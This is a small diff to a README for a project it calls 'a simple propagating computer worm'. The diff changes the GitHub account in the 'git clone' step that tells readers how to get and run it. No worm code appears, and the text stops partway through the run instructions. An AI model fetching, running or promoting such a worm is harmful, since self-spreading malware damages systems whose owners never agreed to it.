@@ -3,7 +3,7 @@ This is a simple propagating computer worm.
 To run just do
 
 ```Bash
-git clone https://github.com/CyberGhostShadow/Worm
+git clone https://github.com/GhostByteHacker/Worm
 ```
 then
 ```Bash
